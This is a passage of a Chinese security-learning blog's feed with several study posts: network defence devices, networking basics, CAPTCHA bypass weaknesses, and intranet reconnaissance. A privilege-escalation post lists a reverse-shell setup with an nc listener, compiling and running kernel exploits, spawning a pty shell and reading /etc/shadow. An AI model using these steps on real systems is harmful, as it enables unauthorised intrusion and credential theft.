title="技术架构"></a>技术架构</h4><ul><li>事件产生器</li><li>事件分析器</li><li>响应单元</li><li>事件数据库</li></ul><h4 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h4><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141130084.png"></p><h4 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h4><ul><li>基于网络的入侵检测系统(<strong>NIDS</strong>)<ul><li>IDS可以放在防火墙或网关的后面, 以网络嗅探器的形式捕获所有的对内对外的数据包</li></ul></li><li>基于主机的入侵检测系统(<strong>HIDS</strong>)<ul><li>安全操作系统必须有一定的审计功能, 并记录相应的安全性内核</li></ul></li><li>分布式入侵检测系统(<strong>DIDS</strong>)</li></ul><h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><ul><li>使用复杂</li><li>现有技术难以满足实际性能需要</li><li>高虚警率, 用户处理的负担重</li><li>许多警告信息难以与入侵行为相关联</li><li>对其他数据的检测可能会受影响</li></ul><h3 id="安全隔离与信息交换系统-网闸"><a href="#安全隔离与信息交换系统-网闸" class="headerlink" title="安全隔离与信息交换系统(网闸)"></a>安全隔离与信息交换系统(网闸)</h3><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><ul><li>外部处理单元</li><li>内部处理单元</li><li>仲裁处理单元</li></ul><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>断开内外网之间的会话(物理隔离, 协议隔离)</li><li>集成了其他安全技术</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141142951.png"></p><h3 id="入侵防御系统-IPS"><a href="#入侵防御系统-IPS" class="headerlink" title="入侵防御系统(IPS)"></a>入侵防御系统(IPS)</h3><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141143640.png"></p><h4 id="IDS与IPS"><a href="#IDS与IPS" class="headerlink" title="IDS与IPS"></a>IDS与IPS</h4><ul><li>IDS: 旁路监听, 只起到检测作用</li><li>IPS: 内联模式, 实时处置数据包</li></ul><h3 id="统一威胁管理系统-UTM"><a href="#统一威胁管理系统-UTM" class="headerlink" title="统一威胁管理系统(UTM)"></a>统一威胁管理系统(UTM)</h3><ul><li>防火墙 + IDS + IPS + 防毒墙</li></ul><h3 id="网络架构安全设计"><a href="#网络架构安全设计" class="headerlink" title="网络架构安全设计"></a>网络架构安全设计</h3><ul><li>合理划分网络安全区域</li><li>规划网络IP地址, vlan设计</li><li>安全配置路由交换设备</li><li>网络边界访问控制</li><li>网络冗余配置(HSRP\vrrp冗余技术), 负载均衡<ul><li>防止单点故障</li><li>提供网络健全性, 安全性</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;网络安全设备&quot;&gt;&lt;a href=&quot;#网络安全设备&quot; class=&quot;headerlink&quot; title=&quot;网络安全设备&quot;&gt;&lt;/a&gt;网络安全设备&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://myprefer.github.io/post/%E7%BD%91%E7%</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>网络拓扑基础</title>
    <link href="https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9F%BA%E7%A1%80.html"/>
    <id>https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9F%BA%E7%A1%80.html</id>
    <published>2024-06-10T08:02:31.000Z</published>
    <updated>2024-06-14T05:52:24.026Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9F%BA%E7%A1%80">网络拓扑基础 | Myprefer’s Blog</a></p><h2 id="网络基础概念"><a href="#网络基础概念" class="headerlink" title="网络基础概念"></a>网络基础概念</h2><h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><ul><li>IP地址在网络中用于标识一个节点(或者网络设备的接口)</li><li>IP地址用于IP报文在网络中的寻址</li></ul><p><em>IP地址就像现实中的地址, 可以标识网络中的一个节点, 数据就是通过它来找到目的地</em></p><h4 id="IP地址格式"><a href="#IP地址格式" class="headerlink" title="IP地址格式"></a>IP地址格式</h4><p><strong>192.168.1</strong>.1</p><p>网络位(192.168.1) + 主机位</p><p>由<strong>子网掩码</strong>决定网络位长度</p><ul><li><strong>192.168.1</strong>.1 — <strong>255.255.255</strong>.0(掩码)</li><li><strong>192.168</strong>.1.1 — <strong>255.255</strong>.0.0(掩码)</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406101743973.png"></p><h4 id="配置IP地址"><a href="#配置IP地址" class="headerlink" title="配置IP地址"></a>配置IP地址</h4><div class="language-shell"><button title="Copy code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">interface</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&lt;</span><span style="color: #C3E88D">接</span><span style="color: #BABED8">口</span><span style="color: #89DDFF">&gt;</span></span><span class="line"><span style="color: #FFCB6B">ip</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">address</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">192.168</span><span style="color: #C3E88D">.1.1</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">255.255</span><span style="color: #C3E88D">.255.0</span></span></code></pre></div><h4 id="Dhcp"><a href="#Dhcp" class="headerlink" title="Dhcp"></a>Dhcp</h4><ul><li>作用: 自动给电脑&#x2F;手机配置IP地址</li></ul><h3 id="DNS域名系统"><a href="#DNS域名系统" class="headerlink" title="DNS域名系统"></a>DNS域名系统</h3><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406101830542.png"></p><h3 id="路由技术基础"><a href="#路由技术基础" class="headerlink" title="路由技术基础"></a>路由技术基础</h3><h4 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h4><p><strong>不同网段</strong>之间的通信需要经过网关</p><h4 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h4><p>路由器的转发原理是通过路由表来判断数据包从哪个接口发出, 实现数据包的转发</p><ul><li>显示路由表: <code>dis ip routing-table  &lt;ip&gt;</code></li></ul><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><ul><li>可靠性高, 三次握手</li><li>延迟高</li></ul><p>适合对文件传输的完整性高, 对延迟不敏感的服务</p><h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><ul><li>速度快</li><li>不可靠</li></ul><p>适用于网络游戏, 视频通话等</p><h4 id="交换机的接口模式"><a href="#交换机的接口模式" class="headerlink" title="交换机的接口模式"></a>交换机的接口模式</h4><ul><li>Access: 用来连接终端, 电脑, 打印机</li><li>Trunk: 用来连接其他交换机</li></ul><h3 id="Vlan虚拟局域网"><a href="#Vlan虚拟局域网" class="headerlink" title="Vlan虚拟局域网"></a>Vlan虚拟局域网</h3><ul><li><p>安全, 隔离<br>vlan-10中的设备可以ping通</p><p>vlan-10与vlan-20中的设备不能ping通</p></li></ul><p>识别数据包属于哪个vlan:</p><ul><li>交换机进行数据包标记, 通过标签判断</li></ul><h3 id="ACL访问控制列表"><a href="#ACL访问控制列表" class="headerlink" title="ACL访问控制列表"></a>ACL访问控制列表</h3><p>根据预先定义好的规则对流量进行<strong>筛选</strong>和<strong>过滤</strong></p><h5 id="ACL的类型"><a href="#ACL的类型" class="headerlink" title="ACL的类型"></a>ACL的类型</h5><ul><li><strong>标准访问控制列表</strong>: 只能基于源ip地址进行过滤</li><li><strong>扩展访问控制列表</strong>: 可以根据源、目IP，TCP&#x2F;UDP协议，源、目端口号进行过滤</li></ul><h3 id="NAT网络地址转换"><a href="#NAT网络地址转换" class="headerlink" title="NAT网络地址转换"></a>NAT网络地址转换</h3><p>用于实现私有网络和公有网络之间的互访                                                                                                   </p><ul><li>NAT外部的主机无法主动跟位于NAT内部的主机通信，NAT内部2主机想要通信，必须主动和公网的一个IP通信，路由器负责建立一个<strong>映射关系</strong>，从而实现数据的转发。</li></ul><h5 id="静态NAT"><a href="#静态NAT" class="headerlink" title="静态NAT"></a>静态NAT</h5><ul><li>静态NAT实现私网地址和公网地址的一对一转换。(服务器公网IP)</li></ul><h3 id="远程管理网络设备"><a href="#远程管理网络设备" class="headerlink" title="远程管理网络设备"></a>远程管理网络设备</h3><ul><li>telnet:<div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">telnet</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&lt;</span><span style="color: #C3E88D">I</span><span style="color: #BABED8">P</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&lt;</span><span style="color: #C3E88D">POR</span><span style="color: #BABED8">T</span><span style="color: #89DDFF">&gt;</span></span></code></pre></div></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%9F%BA%E7%A1%80&quot;&gt;网络拓扑基础 | Myprefer’s Blog&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网安全-网络知识</title>
    <link href="https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86.html"/>
    <id>https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86.html</id>
    <published>2024-06-01T03:11:57.000Z</published>
    <updated>2024-06-14T05:53:47.627Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内网安全-网络知识"><a href="#内网安全-网络知识" class="headerlink" title="内网安全-网络知识"></a>内网安全-网络知识</h2><ul><li><p>隧道技术: 解决不出网协议上线的问题(利用出网协议进行封装出网)(如TCP -&gt; UDP)</p></li><li><p>代理技术: 解决网络通讯不通的问题(利用跳板机建立节点后续操作)</p></li><li><p>连接方向: 正向&amp;方向(内找外&#x2F;外找内)</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;内网安全-网络知识&quot;&gt;&lt;a href=&quot;#内网安全-网络知识&quot; class=&quot;headerlink&quot; title=&quot;内网安全-网络知识&quot;&gt;&lt;/a&gt;内网安全-网络知识&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;隧道技术: 解决不出网协议上线的问题(利用出网协议进行封装出网)(</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>WEB攻防-验证码安全</title>
    <link href="https://myprefer.github.io/post/WEB%E6%94%BB%E9%98%B2-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8.html"/>
    <id>https://myprefer.github.io/post/WEB%E6%94%BB%E9%98%B2-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8.html</id>
    <published>2024-05-07T09:32:21.000Z</published>
    <updated>2024-05-07T14:24:11.405Z</updated>
    
    <content type="html"><![CDATA[<h2 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h2><h4 id="找回密码客户端回显-Response状态值-修改重定向"><a href="#找回密码客户端回显-Response状态值-修改重定向" class="headerlink" title="找回密码客户端回显&amp;Response状态值&amp;修改重定向"></a>找回密码客户端回显&amp;Response状态值&amp;修改重定向</h4><ul><li><p>用回显状态判断-res前端判断不安全</p><ul><li><p>不安全方式:</p></li><li><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">错误验证-&gt;服务器返回状态&lt;3&gt;-&gt;浏览器   错误</span></span><span class="line"><span style="color: #babed8"></span></span><span class="line"><span style="color: #babed8">错误验证-&gt;服务器返回状态&lt;3&gt;-&gt;burp代理抓包改为&lt;1&gt;-&gt;浏览器   正确</span></span><span class="line"><span style="color: #babed8"></span></span><span class="line"><span style="color: #babed8">--客户端验证为准</span></span></code></pre></div></li><li><p>安全方式:</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">错误验证-&gt;服务器返回状态&lt;3&gt;-&gt;burp代理抓包改为&lt;1&gt;-&gt;浏览器显示正确-&gt;服务器后端验证错误-&gt;失败</span></span><span class="line"><span style="color: #babed8"></span></span><span class="line"><span style="color: #babed8">--服务器验证为准</span></span></code></pre></div></li></ul></li><li><p>用用户名重定向-修改标示绕过验证</p></li><li><p>验证码回显显示验证码泄漏验证虚设</p><ul><li>数据包中就有没有加密或加密过的验证码</li></ul></li><li><p>验证码简单机制验证码过于简单爆破</p><ul><li>如四位数字简单验证码(0000~9999), 仅10000钟可能, 如没有次数限制, 可以爆破</li></ul></li></ul><h4 id="验证码验证安全机制-爆破-复用-识别"><a href="#验证码验证安全机制-爆破-复用-识别" class="headerlink" title="验证码验证安全机制-爆破&amp;复用&amp;识别"></a>验证码验证安全机制-爆破&amp;复用&amp;识别</h4><ul><li>验证码简单机制-验证码过于简单爆破</li><li>验证码重复使用验证码验证机制绕过</li><li>验证码智能识别-验证码图形码被识别</li><li>验证码接口调用-验证码触发机制枚举</li></ul><h4 id="验证码技术验证码爆破，验证码复用，验证码识别等"><a href="#验证码技术验证码爆破，验证码复用，验证码识别等" class="headerlink" title="验证码技术验证码爆破，验证码复用，验证码识别等"></a>验证码技术验证码爆破，验证码复用，验证码识别等</h4><ul><li>识别工具:<ul><li><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">smxiazi&#x2F;NEW_xp_CAPTCHA: xp_CAPTCHA(瞎跑 白嫖版) burp 验证码 识别 burp插件 (github.com)</a></li><li><a href="https://github.com/c0ny1/captcha-killer">c0ny1&#x2F;captcha-killer: burp验证码识别接口调用插件 (github.com)</a></li></ul></li></ul><h4 id="安全修复方案"><a href="#安全修复方案" class="headerlink" title="安全修复方案"></a>安全修复方案</h4><ul><li>找回机制要进行每一步验证-防绕过重定向</li><li>找回机制要进行服务端验证-防s数据修改</li><li>找回机制要控制验证码安全防验证码攻击</li><li>验证码接口需验证后被调用-防接口被乱调用</li><li>验证码弱引用智能化人工判断-防验证码被识别</li><li>验证码采用时间段生效失效-防验证码被复用</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;验证码安全&quot;&gt;&lt;a href=&quot;#验证码安全&quot; class=&quot;headerlink&quot; title=&quot;验证码安全&quot;&gt;&lt;/a&gt;验证码安全&lt;/h2&gt;&lt;h4 id=&quot;找回密码客户端回显-Response状态值-修改重定向&quot;&gt;&lt;a href=&quot;#找回密码客户端回显-Resp</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>权限提升</title>
    <link href="https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.html"/>
    <id>https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.html</id>
    <published>2024-04-18T03:44:47.000Z</published>
    <updated>2024-05-20T03:24:32.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>Web权限获取: 插件应用, 数据库, 中间件, 网站源码后台获取… </p><p>网站前台: REC漏洞, 代码执行, 命令执行, 写文件, 写shell</p><h4 id="权限划分"><a href="#权限划分" class="headerlink" title="权限划分"></a>权限划分</h4><ul><li>Linux:<ul><li>管理员UID为0: 系统的管理员用户</li><li>系统用户UID为1~999</li><li>普通用户UID从1000开始</li></ul></li><li>Windows<ul><li>用户及组: system(相当于root) administrator user guest等</li></ul></li></ul><h4 id="具体的几种权限"><a href="#具体的几种权限" class="headerlink" title="具体的几种权限"></a>具体的几种权限</h4><ul><li>后台权限:<ul><li>获取方式: 爆破、注入猜解，弱口令等</li><li>⼀般网站或应用后台智能操作应用的界面内容, 数据图片等信息，无法操作程序的源代码或服务器上的资源文件</li><li>权限提取:<ul><li>通过账户密码等信息获取数据库等权限</li><li>通过文件编辑操作获取网站权限Webshell等</li></ul></li></ul></li><li>网站权限<ul><li>获取方式: 写文件等</li><li>查看或修改（还要看有没有锁权）程序源代码，可以进行网站或应用的配置文件读取（接口配置信息、数据库配置信息等），还能收集服务器操作系统等相关的信息，为后续系统提权做准备</li></ul></li><li>数据库权限<ul><li>获取方式: 源码或配置文件泄露, webshell进行配置文件读取等</li><li>操作数据库的权限，数据库的增删改查等</li><li>权限提取:<ul><li>获取敏感数据, 获取后台权限</li><li>写入文件, 获取webshell</li></ul></li></ul></li><li>接口权限<ul><li>获取方式: 后台（修改配置信息功能点），网站权限（查看配置文件获取）</li><li>邮件、短信、支付等功能接口</li></ul></li></ul><h3 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h3><h4 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h4><h5 id="操作前提"><a href="#操作前提" class="headerlink" title="操作前提"></a>操作前提</h5><ul><li>本地用户 当前计算机的某个用户</li><li>Web权限 当前计算机的web权限 建立在web权限已经取得的情况下进行权限提升</li></ul><h5 id="成功条件"><a href="#成功条件" class="headerlink" title="成功条件"></a>成功条件</h5><ul><li>符合的操作系统</li><li>符合的溢出漏洞</li></ul><h5 id="常见步骤"><a href="#常见步骤" class="headerlink" title="常见步骤"></a>常见步骤</h5><ol><li><p><strong>信息收集</strong></p><ul><li><p>收集: 操作系统版本, 漏洞补丁, 位数(32&#x2F;64) 杀软防护, 网络, 当前用户权限 等信息</p></li><li><p>常用命令:</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">ver</span></span><span class="line"><span style="color: #babed8">systeminfo</span></span><span class="line"><span style="color: #babed8">whoami</span></span><span class="line"><span style="color: #babed8">netstat -ano</span></span><span class="line"><span style="color: #babed8">tasklist /svc</span></span></code></pre></div></li></ul></li><li><p>基于补丁和系统版本 位数籁进行可用溢出漏洞EXP, 上传EXP调用执行去提权</p><ul><li><p>操作方式-<strong>推荐使用自动提权</strong>:</p><ul><li><p>基于手工操作</p></li><li><p>基于CS半自动提权</p></li><li><p>基于MSF全自动提权</p></li></ul></li><li><p>手工提取工具:</p><ul><li><a href="https://github.com/chroblert/WindowsVulnScan">WindowsVulnScan: 基于主机的漏洞扫描工具 (github.com)</a></li><li><a href="https://github.com/vulmon/Vulmap">Vulmap: 在线本地漏洞扫描器(github.com)</a></li><li><a href="https://github.com/bitsadmin/wesng">wesng：Windows 漏洞利用建议器 - 下一代 (github.com)</a></li><li><strong>网页</strong>:<a href="https://i.hacking8.com/tiquan">提权辅助网页 Windows提权辅助 (hacking8.com)</a></li></ul></li><li><p>寻找EXP利用 - 通过漏洞编号查找:</p><ul><li><strong>推</strong>:<a href="https://github.com/Ascotbe/Kernelhub">Ascotbe&#x2F;Kernelhub: Linux、macOS、Windows 提权漏洞合集(github.com)</a></li><li><a href="https://gitlab.com/exploit-database/exploitdb">Exploit-DB &#x2F; Exploits + Shellcode + GHDB · GitLab</a></li><li><a href="https://github.com/nomi-sec/PoC-in-GitHub">nomi-sec&#x2F;PoC-in-GitHub：📡从 GitHub 自动收集 PoC。</a></li><li><a href="https://github.com/k8gege/Ladon">k8gege&#x2F;Ladon: Ladon大型内网渗透工具</a></li></ul></li></ul></li></ol><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><h4 id="第三方软件"><a href="#第三方软件" class="headerlink" title="第三方软件"></a>第三方软件</h4><h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3><p>通常, 在拥有一个webshell的时候, 一般权限都是web权限, 权限较低, 只能执行一些命令, 如查看当前用户, 网络, ip信息等, 如果想进行内网渗透就需要将权限提到最高, 如系统权限, 超级管理员权限</p><h5 id="创建交互shell"><a href="#创建交互shell" class="headerlink" title="创建交互shell"></a>创建交互shell</h5><ul><li><p>linux提权需要交互shell</p></li><li><p>使用工具perl-reverse-shell.pl建立sockets, 本地可以使用nc监听端口<code>nc -vvip 1234</code></p></li></ul><h5 id="查看发行版"><a href="#查看发行版" class="headerlink" title="查看发行版"></a>查看发行版</h5><ul><li><p><code>cat /etc/issue</code></p></li><li><p><code>cat /etc/*release</code></p></li><li><p>查看内核版本<code>uname -a</code></p></li></ul><h5 id="查看可用的提权exp"><a href="#查看可用的提权exp" class="headerlink" title="查看可用的提权exp"></a>查看可用的提权exp</h5><ul><li><a href="https://www.exploit-db.com/">Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers (exploit-db.com)</a></li></ul><h5 id="进行提取"><a href="#进行提取" class="headerlink" title="进行提取"></a>进行提取</h5><ul><li><p>在目标机编译exp, 如果编译不成功在本地编译后上传到目标上<br><code>gcc exp.c -o exp</code></p></li><li><p>增加运行权限<br><code>chmod +x exp</code></p></li><li><p>运行exp</p></li><li><p>切换shell-&gt;<code>/bin/bash</code><br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p></li><li><p>查询当前用户id</p></li><li><p>查询机密文件如<code>/etc/shadow</code></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;权限提升&quot;&gt;&lt;a href=&quot;#权限提升&quot; class=&quot;headerlink&quot; title=&quot;权限提升&quot;&gt;&lt;/a&gt;权限提升&lt;/h2&gt;&lt;p&gt;Web权限获取: 插件应用, 数据库, 中间件, 网站源码后台获取… &lt;/p&gt;
&lt;p&gt;网站前台: REC漏洞, 代码执行, </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网安全-信息收集</title>
    <link href="https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html"/>
    <id>https://myprefer.github.io/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</id>
    <published>2024-04-11T11:50:10.000Z</published>
    <updated>2024-06-01T01:49:20.145Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="一-收集本机信息"><a href="#一-收集本机信息" class="headerlink" title="一.收集本机信息"></a>一.收集本机信息</h3><h4 id="判断是否有域"><a href="#判断是否有域" class="headerlink" title="判断是否有域"></a>判断是否有域</h4><ul><li><p><code>ipconfig /all</code>  在<code>Windows IP 配置</code>项下</p></li><li><p><code>Systeminfo</code> 在”域”词条下, 图中显示为WORKGROUP, 说明没有域<br><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-16%20162703.png?raw=true"></p></li><li><p><code>net time /domain</code></p><ul><li><p>存在域并且当前用户是域用户<br><img src="C:\Users\Myprefer\Desktop\640.jpg"></p></li><li><p>存在域，当前用户不是域用户<br>回显:</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">发生系统错误 5</span></span><span class="line"><span style="color: #babed8"></span></span><span class="line"><span style="color: #babed8">拒绝访问</span></span></code></pre></div></li><li><p>不存在域</p><p><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-17%20152845.png?raw=true"></p></li></ul></li></ul><h4 id="查看当前登录域"><a href="#查看当前登录域" class="headerlink" title="查看当前登录域"></a>查看当前登录域</h4><ul><li><p><code>net config workstation</code></p><p><img src="https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-17%20153107.png?raw=true"></p></li></ul><p>​图中工作站域为workgroup, 则不存在域</p><ul><li><p>ping命令</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF; font-style: italic">for</span><span style="color: #BABED8"> /L %I in</span><span style="color: #89DDFF">(</span><span style="color: #FFCB6B">1,1,254</span><span style="color: #89DDFF">)</span><span style="color: #BABED8"> DO @ping -w 1 -n 1 192.168.110.%I </span><span style="color: #89DDFF">|</span><span style="color: #BABED8"> </span><span style="color: #FFCB6B">findstr</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&quot;</span><span style="color: #C3E88D">TTL=</span><span style="color: #89DDFF">&quot;</span></span></code></pre></div></li><li><p>使用工具扫描探测</p><ul><li><p><strong>nbtscan</strong> - 一个在本地或远程TCP&#x2F;IP网络上扫描开放的NETBIOS名称服务器的命令行工具</p><ul><li><p><a href="https://github.com/resurrecting-open-source-projects/nbtscan">resurrecting-open-source-projects&#x2F;nbtscan: Scan networks searching for NetBIOS information (github.com)</a></p></li><li><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #FFCB6B">用法:</span><span style="color: #BABED8"> </span><span style="color: #C3E88D">nbtscan-unixwiz</span><span style="color: #BABED8"> [选项] 目标 </span><span style="color: #89DDFF">[</span><span style="color: #BABED8">目标...</span><span style="color: #89DDFF">]</span></span><span class="line"></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">目标可以是IP地址，DNS名称或地址的列表范围。</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">范围可以表示成“192.168.12.0/24”或“192.168.12.64-97”</span></span><span class="line"></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">-V</span><span style="color: #BABED8">        </span><span style="color: #C3E88D">显示版本信息</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">-f</span><span style="color: #BABED8">        </span><span style="color: #C3E88D">显示完整的NBT资源记录响应</span><span style="color: #89DDFF">(</span><span style="color: #FFCB6B">推荐</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">-H</span><span style="color: #BABED8">        </span><span style="color: #C3E88D">生成HTTP请求头</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">-v</span><span style="color: #BABED8">        </span><span style="color: #C3E88D">开启详细输出调试</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">-n</span><span style="color: #BABED8">        </span><span style="color: #C3E88D">不查找响应IP地址的反向名称</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">-p</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&lt;</span><span style="color: #BABED8">n</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">绑定UDP端口</span><span style="color: #89DDFF">(</span><span style="color: #FFCB6B">默认0</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">-m</span><span style="color: #BABED8">        </span><span style="color: #C3E88D">响应中包含MAC地址</span><span style="color: #BABED8"> (等同</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">-f</span><span style="color: #89DDFF">&#39;</span><span style="color: #BABED8">)</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">-T</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&lt;</span><span style="color: #BABED8">n</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">超时不响应</span><span style="color: #BABED8"> (默认2秒)</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">-w</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&lt;</span><span style="color: #BABED8">n</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">次写入后等待秒数</span><span style="color: #BABED8"> (默认10ms)</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">-t</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">&lt;</span><span style="color: #BABED8">n</span><span style="color: #89DDFF">&gt;</span><span style="color: #BABED8">    </span><span style="color: #C3E88D">每个地址尝试次数</span><span style="color: #89DDFF">(</span><span style="color: #FFCB6B">默认1次</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">   </span><span style="color: #FFCB6B">-P</span><span style="color: #BABED8">        </span><span style="color: #C3E88D">以perl的hashref格式生成结果</span></span></code></pre></div></li></ul></li><li><p><strong>arp-scan</strong> - ARP扫描工具</p><ul><li>使用: <a href="https://blog.csdn.net/newbeixue/article/details/123111543">arp-scan使用-CSDN博客</a></li></ul></li></ul></li></ul><h4 id="域内端口扫描"><a href="#域内端口扫描" class="headerlink" title="域内端口扫描"></a>域内端口扫描</h4><ul><li><p><strong>telnet</strong> 命令扫描</p><div class="language-sh"><button title="Copy code" class="copy"></button><span class="lang">sh</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: 